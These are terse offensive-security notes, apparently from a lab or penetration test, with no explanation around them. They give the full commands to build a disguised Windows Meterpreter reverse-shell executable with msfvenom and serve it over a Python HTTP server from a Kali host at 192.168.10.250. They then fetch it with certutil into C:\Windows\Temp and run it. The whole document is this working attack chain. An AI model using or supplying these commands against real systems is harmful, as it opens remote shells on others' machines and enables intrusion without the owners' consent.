kali 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.250 LPORT=5555 -f exe > tool.exe
python3 -m http.server 8080


CMD 
certutil -urlcache -split -f http://192.168.10.250:8080/tool.exe C:\Windows\Temp\tool.exe

C:\Windows\Temp\tool.exe
